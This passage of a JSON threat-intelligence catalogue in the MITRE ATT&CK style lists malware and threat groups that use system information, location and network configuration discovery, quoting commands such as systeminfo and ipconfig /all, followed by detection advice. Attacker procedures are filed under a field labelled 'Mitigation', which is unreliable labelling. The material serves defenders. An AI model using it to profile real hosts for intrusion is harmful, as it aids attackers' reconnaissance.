        "id": "S0457",
        "name": "Netwalker",
        "description": "Netwalker can determine the system architecture it is running on to choose which version of the DLL to use.[257]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE can discover and collect victim system information.[258]"
      },
      {
        "id": "S0385",
        "name": "njRAT",
        "description": "njRAT enumerates the victim operating system and computer name during the initial infection.[259]"
      },
      {
        "id": "S0353",
        "name": "NOKKI",
        "description": "NOKKI can gather information on drives and the operating system on the victim’s machine.[260]"
      },
      {
        "id": "S0644",
        "name": "ObliqueRAT",
        "description": "ObliqueRAT has the ability to check for blocklisted computer names on infected endpoints.[261]"
      },
      {
        "id": "S0346",
        "name": "OceanSalt",
        "description": "OceanSalt can collect the computer name from the system.[262]"
      },
      {
        "id": "S0340",
        "name": "Octopus",
        "description": "Octopus can collect system drive information, the computer name, the size of the disk, OS version, and OS architecture information.[263]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has run hostname and systeminfo on a victim.[264][265][266][267]"
      },
      {
        "id": "S0439",
        "name": "Okrum",
        "description": "Okrum can collect computer name, locale information, and information about the OS and architecture.[268]"
      },
      {
        "id": "S0264",
        "name": "OopsIE",
        "description": "OopsIE checks for information on the CPU fan, temperature, mouse, hard disk, and motherboard as part of its anti-VM checks.[269]"
      },
      {
        "id": "C0012",
        "name": "Operation CuckooBees",
        "description": "During Operation CuckooBees, the threat actors used the systeminfo command to gather details about a compromised system.[270]"
      },
      {
        "id": "C0006",
        "name": "Operation Honeybee",
        "description": "During Operation Honeybee, the threat actors collected the computer name, OS, and other system information using cmd /c systeminfo > %temp%\\ temp.ini.[271]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors discovered the local disks attached to the system and their hardware information including manufacturer and model, as well as the OS versions of systems connected to a targeted network.[272]"
      },
      {
        "id": "S0229",
        "name": "Orz",
        "description": "Orz can gather the victim OS version and whether it is 64 or 32 bit.[253]"
      },
      {
        "id": "S0165",
        "name": "OSInfo",
        "description": "OSInfo discovers information about the infected machine.[23]"
      },
      {
        "id": "S0402",
        "name": "OSX/Shlayer",
        "description": "OSX/Shlayer has collected the IOPlatformUUID, session UID, and the OS version using the command sw_vers -productVersion.[273][274]"
      },
      {
        "id": "S0352",
        "name": "OSX_OCEANLOTUS.D",
        "description": "OSX_OCEANLOTUS.D collects processor information, memory information, computer name, hardware UUID, serial number, and operating system version. OSX_OCEANLOTUS.D has used the ioreg command to gather some of this information.[275][276][3]"
      },
      {
        "id": "S0208",
        "name": "Pasam",
        "description": "Pasam creates a backdoor through which remote attackers can retrieve information such as hostname and free disk space.[277]"
      },
      {
        "id": "G0040",
        "name": "Patchwork",
        "description": "Patchwork collected the victim computer name, OS version, and architecture type and sent the information to its C2 server. Patchwork also enumerated all available drives on the victim's machine.[278][255]"
      },
      {
        "id": "S0556",
        "name": "Pay2Key",
        "description": "Pay2Key has the ability to gather the hostname of the victim machine.[279]"
      },
      {
        "id": "S0587",
        "name": "Penquin",
        "description": "Penquin can report the file system type and disk space of a compromised host to C2.[280]"
      },
      {
        "id": "S0048",
        "name": "PinchDuke",
        "description": "PinchDuke gathers system configuration information.[281]"
      },
      {
        "id": "S1031",
        "name": "PingPull",
        "description": "PingPull can retrieve the hostname of a compromised host.[282]"
      },
      {
        "id": "S0501",
        "name": "PipeMon",
        "description": "PipeMon can collect and send OS version and computer name as a part of its C2 beacon.[283]"
      },
      {
        "id": "S0124",
        "name": "Pisloader",
        "description": "Pisloader has a command to collect victim system information, including the system name and OS version.[284]"
      },
      {
        "id": "S0254",
        "name": "PLAINTEE",
        "description": "PLAINTEE collects general system enumeration data about the infected machine and checks the OS version.[285]"
      },
      {
        "id": "S0428",
        "name": "PoetRAT",
        "description": "PoetRAT has the ability to gather information about the compromised host.[286]"
      },
      {
        "id": "S0453",
        "name": "Pony",
        "description": "Pony has collected the Service Pack, language, and region information to send to the C2.[287]"
      },
      {
        "id": "S0216",
        "name": "POORAIM",
        "description": "POORAIM can identify system information, including battery status.[161]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 contains modules, such as Get-ComputerInfo, for enumerating common system information.[288]"
      },
      {
        "id": "S0139",
        "name": "PowerDuke",
        "description": "PowerDuke has commands to get information about the victim's name, build, version, serial number, and memory usage.[289]"
      },
      {
        "id": "S0441",
        "name": "PowerShower",
        "description": "PowerShower has collected system information on the infected host.[290]"
      },
      {
        "id": "S0223",
        "name": "POWERSTATS",
        "description": "POWERSTATS can retrieve OS name/architecture and computer/domain name information from compromised hosts.[291][292]"
      },
      {
        "id": "S0184",
        "name": "POWRUNER",
        "description": "POWRUNER may collect information about the system by running hostname and systeminfo on a victim.[293]"
      },
      {
        "id": "S0113",
        "name": "Prikormka",
        "description": "A module in Prikormka collects information from the victim about Windows OS version, computer name, battery info, and physical memory.[294]"
      },
      {
        "id": "S0238",
        "name": "Proxysvc",
        "description": "Proxysvc collects the OS version, country name, MAC address, computer name, physical memory statistics, and volume information for all drives on the system.[212]"
      },
      {
        "id": "S0196",
        "name": "PUNCHBUGGY",
        "description": "PUNCHBUGGY can gather system information such as computer names.[295]"
      },
      {
        "id": "S0192",
        "name": "Pupy",
        "description": "Pupy can grab a system’s information including the OS version, architecture, etc.[296]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can collect system information including the OS version and domain on a compromised host.[297][298][299]"
      },
      {
        "id": "S0262",
        "name": "QuasarRAT",
        "description": "QuasarRAT can gather system information from the victim’s machine including the OS type.[300]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay can detect system information--including disk names, total space, and remaining space--to create a hardware profile GUID which acts as a system identifier for operators.[301][302]"
      },
      {
        "id": "S0241",
        "name": "RATANKBA",
        "description": "RATANKBA gathers information about the OS architecture, OS name, and OS version/Service pack.[303][304]"
      },
      {
        "id": "S0662",
        "name": "RCSession",
        "description": "RCSession can gather system information from a compromised host.[305]"
      },
      {
        "id": "S0172",
        "name": "Reaver",
        "description": "Reaver collects system information from the victim, including CPU speed, computer name, volume serial number, ANSI code page, OEM code page identifier for the OS, Microsoft Windows version, and memory information.[306]"
      },
      {
        "id": "S0153",
        "name": "RedLeaves",
        "description": "RedLeaves can gather extended system information including the hostname, OS version number, platform, memory information, time elapsed since system startup, and CPU information.[90][307]"
      },
      {
        "id": "S0125",
        "name": "Remsec",
        "description": "Remsec can obtain the OS version information, computer name, processor architecture, machine role, and OS edition.[308]"
      },
      {
        "id": "S0379",
        "name": "Revenge RAT",
        "description": "Revenge RAT collects the CPU information, OS information, and system language.[309]"
      },
      {
        "id": "S0496",
        "name": "REvil",
        "description": "REvil can identify the username, machine name, system language, keyboard layout, OS version, and system drive information on a compromised host.[310][311][312][313][313][314][315][316]"
      },
      {
        "id": "S0433",
        "name": "Rifdoor",
        "description": "Rifdoor has the ability to identify the Windows version on the compromised host.[317]"
      },
      {
        "id": "S0448",
        "name": "Rising Sun",
        "description": "Rising Sun can detect the computer name, operating system, and drive information, including drive type, total number of bytes on disk, total number of free bytes on disk, and name of a specified volume.[318]"
      },
      {
        "id": "G0106",
        "name": "Rocke",
        "description": "Rocke has used uname -m to collect the name and information about the infected system's kernel.[319]"
      },
      {
        "id": "S0270",
        "name": "RogueRobin",
        "description": "RogueRobin gathers BIOS versions and manufacturers, the number of CPU cores, the total physical memory, and the computer name.[320]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT can gather the hostname and the OS version to ensure it doesn’t run on a Windows XP or Windows Server 2003 systems.[321][322][323][324][325][326]"
      },
      {
        "id": "S1078",
        "name": "RotaJakiro",
        "description": "RotaJakiro executes a set of commands to collect device information, including uname.  Another example is the cat /etc/*release | uniq command used to collect the current OS distribution.[327]"
      },
      {
        "id": "S1073",
        "name": "Royal",
        "description": "Royal can use GetNativeSystemInfo and GetLogicalDrives to enumerate system processors and logical drives.[328][329]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM can obtain the computer name, OS version, and default language identifier.[330]"
      },
      {
        "id": "S0253",
        "name": "RunningRAT",
        "description": "RunningRAT gathers the OS version, logical drives information, processor information, and volume information.[71]"
      },
      {
        "id": "S0446",
        "name": "Ryuk",
        "description": "Ryuk has called GetLogicalDrives to emumerate all mounted drives, and GetDriveTypeW to determine the drive type.[331]"
      },
      {
        "id": "S0085",
        "name": "S-Type",
        "description": "The initial beacon packet for S-Type contains the operating system version and file system of the victim.[239]"
      },
      {
        "id": "S1018",
        "name": "Saint Bot",
        "description": "Saint Bot can identify the OS version, CPU, and other details from a victim's machine.[332]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team used a backdoor to enumerate information about the infected system's operating system.[333][334]"
      },
      {
        "id": "S1085",
        "name": "Sardonic",
        "description": "Sardonic has the ability to collect the computer name, CPU manufacturer name, and C:\\ drive serial number from a compromised machine. Sardonic also has the ability to execute the ver and systeminfo commands.[335]"
      },
      {
        "id": "S0461",
        "name": "SDBbot",
        "description": "SDBbot has the ability to identify the OS version, OS bit information and computer name.[151][15]"
      },
      {
        "id": "S0382",
        "name": "ServHelper",
        "description": "ServHelper will attempt to enumerate Windows version and system architecture.[336]"
      },
      {
        "id": "S0596",
        "name": "ShadowPad",
        "description": "ShadowPad has discovered system information including memory status, CPU frequency, OS versions, and volume serial numbers.[337]"
      },
      {
        "id": "S0140",
        "name": "Shamoon",
        "description": "Shamoon obtains the victim's operating system version and keyboard layout and sends the information to the C2 server.[338][339]"
      },
      {
        "id": "S1019",
        "name": "Shark",
        "description": "Shark can collect the GUID of a targeted machine.[236][237]"
      },
      {
        "id": "S1089",
        "name": "SharpDisco",
        "description": "SharpDisco can use a plugin to enumerate system drives.[340]"
      },
      {
        "id": "S0546",
        "name": "SharpStage",
        "description": "SharpStage has checked the system settings to see if Arabic is the configured language.[341]"
      },
      {
        "id": "S0450",
        "name": "SHARPSTATS",
        "description": "SHARPSTATS has the ability to identify the IP address, machine name, and OS of the compromised host.[292]"
      },
      {
        "id": "S0445",
        "name": "ShimRatReporter",
        "description": "ShimRatReporter gathered the operating system name and specific Windows version of an infected machine.[342]"
      },
      {
        "id": "S0217",
        "name": "SHUTTERSPEED",
        "description": "SHUTTERSPEED can collect system information.[161]"
      },
      {
        "id": "G1008",
        "name": "SideCopy",
        "description": "SideCopy has identified the OS version of a compromised host.[8]"
      },
      {
        "id": "S0610",
        "name": "SideTwist",
        "description": "SideTwist can collect the computer name of a targeted system.[267]"
      },
      {
        "id": "G0121",
        "name": "Sidewinder",
        "description": "Sidewinder has used tools to collect the computer name, OS version, installed hotfixes, as well as information regarding the memory and processor on a compromised host.[343][344]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can collect information related to a compromised host, including OS version and a list of drives.[345]"
      },
      {
        "id": "S0468",
        "name": "Skidmap",
        "description": "Skidmap has the ability to check whether the infected system’s OS is Debian or RHEL/CentOS to determine which cryptocurrency miner it should use.[346]"
      },
      {
        "id": "S0533",
        "name": "SLOTHFULMEDIA",
        "description": "SLOTHFULMEDIA has collected system name, OS version, adapter information, memory usage, and disk information from a victim machine.[347]"
      },
      {
        "id": "S0218",
        "name": "SLOWDRIFT",
        "description": "SLOWDRIFT collects and sends system information to its C2.[161]"
      },
      {
        "id": "S0649",
        "name": "SMOKEDHAM",
        "description": "SMOKEDHAM has used the systeminfo command on a compromised host.[348]"
      },
      {
        "id": "S1086",
        "name": "Snip3",
        "description": "Snip3 has the ability to query Win32_ComputerSystem for system information. [349]"
      },
      {
        "id": "S0627",
        "name": "SodaMaster",
        "description": "SodaMaster can enumerate the host name and OS version on a target system.[350]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 used fsutil to check available free space before executing actions that might create large files on disk.[351]"
      },
      {
        "id": "S0615",
        "name": "SombRAT",
        "description": "SombRAT can execute getinfo to enumerate the computer name and OS version of a compromised system.[352]"
      },
      {
        "id": "S0516",
        "name": "SoreFang",
        "description": "SoreFang can collect the hostname, operating system configuration, product ID, and disk space on victim machines by executing Systeminfo.[353]"
      },
      {
        "id": "S0157",
        "name": "SOUNDBITE",
        "description": "SOUNDBITE is capable of gathering system information.[202]"
      },
      {
        "id": "G0054",
        "name": "Sowbug",
        "description": "Sowbug obtained OS version and hardware configuration from a victim.[354]"
      },
      {
        "id": "S0543",
        "name": "Spark",
        "description": "Spark can collect the hostname, keyboard layout, and language from the system.[355]"
      },
      {
        "id": "S0374",
        "name": "SpeakUp",
        "description": "SpeakUp uses the cat /proc/cpuinfo | grep -c \"cpu family\" 2>&1 command to gather system information. [356]"
      },
      {
        "id": "S0646",
        "name": "SpicyOmelette",
        "description": "SpicyOmelette can identify the system name of a compromised host.[357]"
      },
      {
        "id": "S1030",
        "name": "Squirrelwaffle",
        "description": "Squirrelwaffle has gathered victim computer information and configurations.[358]"
      },
      {
        "id": "S0058",
        "name": "SslMM",
        "description": "SslMM sends information to its hard-coded C2, including OS version, service pack information, processor speed, system name, and OS install date.[359]"
      },
      {
        "id": "S1037",
        "name": "STARWHALE",
        "description": "STARWHALE can gather the computer name of an infected host.[360][361]"
      },
      {
        "id": "G0038",
        "name": "Stealth Falcon",
        "description": "Stealth Falcon malware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory.[362]"
      },
      {
        "id": "S0380",
        "name": "StoneDrill",
        "description": "StoneDrill has the capability to discover the system OS, Windows version, architecture and environment.[363]"
      },
      {
        "id": "S0142",
        "name": "StreamEx",
        "description": "StreamEx has the ability to enumerate system information.[364]"
      },
      {
        "id": "S1034",
        "name": "StrifeWater",
        "description": "StrifeWater can collect the OS version, architecture, and machine name to create a unique token for the infected host.[365]"
      },
      {
        "id": "S0491",
        "name": "StrongPity",
        "description": "StrongPity can identify the hard disk volume serial number on a compromised host.[366]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet collects system information including computer and domain names, OS version, and S7P paths.[367]"
      },
      {
        "id": "S0559",
        "name": "SUNBURST",
        "description": "SUNBURST collected hostname, OS version, and device uptime.[368][369]"
      },
      {
        "id": "S1064",
        "name": "SVCReady",
        "description": "SVCReady has the ability to collect information such as computer name, computer manufacturer, BIOS, operating system, and firmware, including through the use of systeminfo.exe.[370]"
      },
      {
        "id": "S0242",
        "name": "SynAck",
        "description": "SynAck gathers computer names, OS version info, and also checks installed keyboard layouts to estimate if it has been launched from a certain list of countries.[371]"
      },
      {
        "id": "S0060",
        "name": "Sys10",
        "description": "Sys10 collects the computer name, OS versioning information, and OS install date and sends the information to the C2.[359]"
      },
      {
        "id": "S0464",
        "name": "SYSCON",
        "description": "SYSCON has the ability to use Systeminfo to identify system information.[85]"
      },
      {
        "id": "S0096",
        "name": "Systeminfo",
        "description": "Systeminfo can be used to gather information about the operating system.[372]"
      },
      {
        "id": "S0663",
        "name": "SysUpdate",
        "description": "SysUpdate can collect a system's architecture, operating system version, hostname, and drive information.[373][374]"
      },
      {
        "id": "S0098",
        "name": "T9000",
        "description": "T9000 gathers and beacons the operating system build number and CPU Architecture (32-bit/64-bit) during installation.[375]"
      },
      {
        "id": "G1018",
        "name": "TA2541",
        "description": "TA2541 has collected system information prior to downloading malware on the targeted host.[376]"
      },
      {
        "id": "S0586",
        "name": "TAINTEDSCRIBE",
        "description": "TAINTEDSCRIBE can use DriveList to retrieve drive information.[377]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal has the ability to identify hardware information, the computer name, and OS information on an infected host.[378]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has searched for system version, architecture, disk partition, logical volume, and hostname information.[379][380]"
      },
      {
        "id": "S0665",
        "name": "ThreatNeedle",
        "description": "ThreatNeedle can collect system profile information from a compromised host.[381]"
      },
      {
        "id": "S0678",
        "name": "Torisma",
        "description": "Torisma can use GetlogicalDrives to get a bitmask of all drives available on a compromised system. It can also use GetDriveType to determine if a new drive is a CD-ROM drive.[382]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot gathers the OS version, machine name, CPU type, amount of RAM available, and UEFI/BIOS firmware information from the victim’s machine.[383][384][385][386]"
      },
      {
        "id": "S0094",
        "name": "Trojan.Karagany",
        "description": "Trojan.Karagany can capture information regarding the victim's OS, security, and hardware configuration.[387]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper has detected a target system’s OS version and system volume information.[388][389]"
      },
      {
        "id": "S0647",
        "name": "Turian",
        "description": "Turian can retrieve system information including OS version, memory usage, local hostname, and system adapter information.[390]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla surveys a system upon check-in to discover operating system configuration details using the systeminfo and set commands.[391][392]"
      },
      {
        "id": "S0199",
        "name": "TURNEDUP",
        "description": "TURNEDUP is capable of gathering system information.[393]"
      },
      {
        "id": "S0263",
        "name": "TYPEFRAME",
        "description": "TYPEFRAME can gather the disk volume information.[394]"
      },
      {
        "id": "S0130",
        "name": "Unknown Logger",
        "description": "Unknown Logger can obtain information about the victim computer name, physical memory, country, and date.[395]"
      },
      {
        "id": "S0275",
        "name": "UPPERCUT",
        "description": "UPPERCUT has the capability to gather the system’s hostname and OS version.[396]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
        "description": "Uroburos has the ability to gather basic system information and run the POSIX API gethostbyname.[397]"
      },
      {
        "id": "S0386",
        "name": "Ursnif",
        "description": "Ursnif has used Systeminfo to gather system information.[398]"
      },
      {
        "id": "S0476",
        "name": "Valak",
        "description": "Valak can determine the Windows version and computer name on a compromised host.[399][400]"
      },
      {
        "id": "S0257",
        "name": "VERMIN",
        "description": "VERMIN collects the OS name, machine name, and architecture information.[401]"
      },
      {
        "id": "S0180",
        "name": "Volgmer",
        "description": "Volgmer can gather system information, the computer name, OS version, drive and serial information from the victim's machine.[402][403][404]"
      },
      {
        "id": "G1017",
        "name": "Volt Typhoon",
        "description": "Volt Typhoon has discovered file system types, drive names, size, and free space on compromised systems.[405][406][407]"
      },
      {
        "id": "S0670",
        "name": "WarzoneRAT",
        "description": "WarzoneRAT can collect compromised host information, including OS version, PC name, RAM size, and CPU details.[408]"
      },
      {
        "id": "S0514",
        "name": "WellMess",
        "description": "WellMess can identify the computer name of a compromised host.[409][410]"
      },
      {
        "id": "S0689",
        "name": "WhisperGate",
        "description": "WhisperGate has the ability to enumerate fixed logical drives on a targeted system.[411]"
      },
      {
        "id": "G0124",
        "name": "Windigo",
        "description": "Windigo has used a script to detect which Linux distribution and version is currently installed on the system.[69]"
      },
      {
        "id": "S0155",
        "name": "WINDSHIELD",
        "description": "WINDSHIELD can gather the victim computer name.[202]"
      },
      {
        "id": "G0112",
        "name": "Windshift",
        "description": "Windshift has used malware to identify the computer name of a compromised host.[412]"
      },
      {
        "id": "S0219",
        "name": "WINERACK",
        "description": "WINERACK can gather information about the host.[161]"
      },
      {
        "id": "S0176",
        "name": "Wingbird",
        "description": "Wingbird checks the victim OS version after executing to determine where to drop files based on whether the victim is 32-bit or 64-bit.[413]"
      },
      {
        "id": "S0059",
        "name": "WinMM",
        "description": "WinMM collects the system name, OS version including service pack, and system install date and sends the information to the C2 server.[359]"
      },
      {
        "id": "S0141",
        "name": "Winnti for Windows",
        "description": "Winnti for Windows can determine if the OS on a compromised host is newer than Windows XP.[414]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has used Systeminfo and similar commands to acquire detailed configuration information of a victim's machine. Wizard Spider has also utilized the PowerShell cmdlet Get-ADComputer to collect DNS hostnames, last logon dates, and operating system information from Active Directory.[415][416]"
      },
      {
        "id": "S1065",
        "name": "Woody RAT",
        "description": "Woody RAT can retrieve the following information from an infected machine: OS, architecture, computer name, OS build version, environment variables, and storage drives.[417]"
      },
      {
        "id": "S0161",
        "name": "XAgentOSX",
        "description": "XAgentOSX contains the getInstalledAPP function to run ls -la /Applications to gather what applications are installed.[418]"
      },
      {
        "id": "S0658",
        "name": "XCSSET",
        "description": "XCSSET identifies the macOS version and uses ioreg to determine serial number.[419]"
      },
      {
        "id": "S0388",
        "name": "YAHOYAH",
        "description": "YAHOYAH checks for the system’s Windows OS version and hostname.[388]"
      },
      {
        "id": "S0248",
        "name": "yty",
        "description": "yty gathers the computer name, the serial number of the main disk volume, CPU information, Microsoft Windows version, and runs the command systeminfo.[420]"
      },
      {
        "id": "S0251",
        "name": "Zebrocy",
        "description": "Zebrocy collects the OS version, computer name and serial number for the storage volume C:. Zebrocy also runs the systeminfo command to gather system information. [421][80][422][81][423][424][425]"
      },
      {
        "id": "S0230",
        "name": "ZeroT",
        "description": "ZeroT gathers the victim's computer name, Windows version, and system language, and then sends it to its C2 server.[426]"
      },
      {
        "id": "S0330",
        "name": "Zeus Panda",
        "description": "Zeus Panda collects the OS version, system architecture, computer name, product ID, install date, and information on the keyboard mapping to determine the language used on the system.[427][428]"
      },
      {
        "id": "G0128",
        "name": "ZIRCONIUM",
        "description": "ZIRCONIUM has used a tool to capture the processor architecture of a compromised host in order to register it with C2.[429]"
      },
      {
        "id": "S0086",
        "name": "ZLib",
        "description": "ZLib has the ability to enumerate system information.[239]"
      },
      {
        "id": "S0672",
        "name": "Zox",
        "description": "Zox can enumerate attached drives.[430]"
      },
      {
        "id": "S0350",
        "name": "zwShell",
        "description": "zwShell can obtain the victim PC name and OS version.[431]"
      },
      {
        "id": "S0412",
        "name": "ZxShell",
        "description": "ZxShell can collect the local hostname, operating system details, CPU speed, and total physical memory.[432]"
      },
      {
        "id": "S1013",
        "name": "ZxxZ",
        "description": "ZxxZ has collected the host name and operating system product name from a compromised machine.[433]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. For network devices, monitor executed commands in AAA logs, especially those run by unexpected or unauthorized users."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell. In cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor newly executed processes that may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture."
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "System Location Discovery",
    "Code": "T1614",
    "Description": "Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from System Location Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Adversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.[1][2][3] Windows API functions such as GetLocaleInfoW can also be used to determine the locale of the host.[1] In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.[4][5]Adversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.[6][2]",
    "Mitigation": [
      {
        "id": "S1025",
        "name": "Amadey",
        "description": "Amadey does not run any tasks or install additional malware if the victim machine is based in Russia.[7]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson can identify the geographical location of a victim host.[8]"
      },
      {
        "id": "S0673",
        "name": "DarkWatchman",
        "description": "DarkWatchman can identity the OS locale of a compromised host.[9]"
      },
      {
        "id": "S0632",
        "name": "GrimAgent",
        "description": "GrimAgent can identify the country code on a compromised host.[10]"
      },
      {
        "id": "S0262",
        "name": "QuasarRAT",
        "description": "QuasarRAT can determine the country a victim host is located in.[11]"
      },
      {
        "id": "S0481",
        "name": "Ragnar Locker",
        "description": "Before executing malicious code, Ragnar Locker checks the Windows API GetLocaleInfoW and doesn't encrypt files if it finds a former Soviet country.[1]"
      },
      {
        "id": "S1018",
        "name": "Saint Bot",
        "description": "Saint Bot has conducted system locale checks to see if the compromised host is in Russia, Ukraine, Belarus, Armenia, Kazakhstan, or Moldova.[12][13]"
      },
      {
        "id": "S0461",
        "name": "SDBbot",
        "description": "SDBbot can collected the country code of a compromised machine.[14]"
      },
      {
        "id": "G1008",
        "name": "SideCopy",
        "description": "SideCopy has identified the country location of a compromised host.[15]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may gather information in an attempt to calculate the geographical location of a victim host."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Remote access tools with built-in features may interact directly with the Windows API, such as calling  GetLocaleInfoW to gather information.[1]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor newly executed processes that may gather information in an attempt to calculate the geographical location of a victim host."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1614.001",
        "name": "System Language Discovery"
      }
    ],
    "Tactic": "\nDiscovery"
  },
  {
    "Title": "System Network Configuration Discovery",
    "Code": "T1016",
    "Description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.Adversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. show ip route, show ip interface).[1][2]Adversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
    "Mitigation": [
      {
        "id": "S1028",
        "name": "Action RAT",
        "description": "Action RAT has the ability to collect the MAC address of an infected host.[3]"
      },
      {
        "id": "S0552",
        "name": "AdFind",
        "description": "AdFind can extract subnet information from Active Directory.[4][5][6]"
      },
      {
        "id": "G0018",
        "name": "admin@338",
        "description": "admin@338 actors used the following command after exploiting a machine with LOWBALL malware to acquire information about local networks: ipconfig /all >> %temp%\\download[7]"
      },
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla can collect the IP address of the victim machine and spawn instances of netsh.exe to enumerate wireless settings.[8][9]"
      },
      {
        "id": "S0092",
        "name": "Agent.btz",
        "description": "Agent.btz collects the network adapter’s IP and MAC address as well as IP addresses of the network adapter’s default gateway, primary/secondary WINS, DHCP, and DNS servers, and saves them into a log file.[10]"
      },
      {
        "id": "S1025",
        "name": "Amadey",
        "description": "Amadey can identify the IP address of a victim machine.[11]"
      },
      {
        "id": "S0504",
        "name": "Anchor",
        "description": "Anchor can determine the public IP and location of a compromised host.[12]"
      },
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed can identify the IP of a targeted system.[13]"
      },
      {
        "id": "G0006",
        "name": "APT1",
        "description": "APT1 used the ipconfig /all command to gather network configuration information.[14]"
      },
      {
        "id": "G0073",
        "name": "APT19",
        "description": "APT19 used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim’s machine.[15]"
      },
      {
        "id": "G0022",
        "name": "APT3",
        "description": "A keylogging tool used by APT3 gathers network information from the victim, including the MAC address, IP address, WINS, DHCP server, and gateway.[16][17]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 used the ipconfig /all command to gather the IP address from the system.[18]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 collected MAC addresses from victim machines.[19][20]"
      },
      {
        "id": "S0456",
        "name": "Aria-body",
        "description": "Aria-body has the ability to identify the location, public IP address, and domain name on a compromised host.[21]"
      },
      {
        "id": "S0099",
        "name": "Arp",
        "description": "Arp can be used to display ARP configuration information on the host.[22]"
      },
      {
        "id": "S0373",
        "name": "Astaroth",
        "description": "Astaroth collects the external IP address from the system. [23]"
      },
      {
        "id": "S0640",
        "name": "Avaddon",
        "description": "Avaddon can collect the external IP address of the victim.[24]"
      },
      {
        "id": "S0473",
        "name": "Avenger",
        "description": "Avenger can identify the domain of the compromised host.[25]"
      },
      {
        "id": "S0344",
        "name": "Azorult",
        "description": "Azorult can collect host IP information from the victim’s machine.[26]"
      },
      {
        "id": "S0414",
        "name": "BabyShark",
        "description": "BabyShark has executed the ipconfig /all command.[27]"
      },
      {
        "id": "S0093",
        "name": "Backdoor.Oldrea",
        "description": "Backdoor.Oldrea collects information about the Internet adapter configuration.[28][29]"
      },
      {
        "id": "S0245",
        "name": "BADCALL",
        "description": "BADCALL collects the network adapter information.[30]"
      },
      {
        "id": "S0642",
        "name": "BADFLICK",
        "description": "BADFLICK has captured victim IP address details.[31]"
      },
      {
        "id": "S0234",
        "name": "Bandook",
        "description": "Bandook has a command to get the public IP address from a system.[32]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can collect the IP address and NetBIOS name of an infected machine.[33]"
      },
      {
        "id": "S0268",
        "name": "Bisonal",
        "description": "Bisonal can execute ipconfig on the victim’s machine.[34][35][36]"
      },
      {
        "id": "S0089",
        "name": "BlackEnergy",
        "description": "BlackEnergy has gathered information about network IP configurations using ipconfig.exe and about routing tables using route.exe.[37][38]"
      },
      {
        "id": "S0520",
        "name": "BLINDINGCAN",
        "description": "BLINDINGCAN has collected the victim machine's local IP address information and MAC address.[39]"
      },
      {
        "id": "S0657",
        "name": "BLUELIGHT",
        "description": "BLUELIGHT can collect IP information from the victim’s machine.[40]"
      },
      {
        "id": "S0486",
        "name": "Bonadan",
        "description": "Bonadan can find the external IP address of the infected host.[41]"
      },
